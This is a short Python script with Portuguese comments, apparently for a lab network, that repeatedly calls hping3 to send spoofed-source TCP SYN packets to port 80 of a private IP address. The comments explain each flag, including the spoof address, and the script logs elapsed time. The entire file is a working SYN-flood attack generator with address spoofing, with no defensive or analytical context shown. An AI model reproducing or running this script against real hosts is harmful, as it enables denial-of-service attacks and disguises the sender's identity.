import subprocess, time, sys

now = time.perf_counter()

time.sleep(30)

for j in range(45):
  subprocess.call('hping3 -c 100 -S -p 80 -i u20000 -a 172.20.1.3 172.20.1.2', shell=True)
  # -c: Numero de pacotes enviados.
  # -S: Flag utilizada no ataque (SYN).
  # -p: Porta de destino.
  # -i: Taxa de envio (u20000 = 20 pacotes por segundo).
  # -a: Endereço de spoof.
  sys.stdout.write(f'Tempo: {(time.perf_counter()-now):.2f}s\n')
  time.sleep(10)
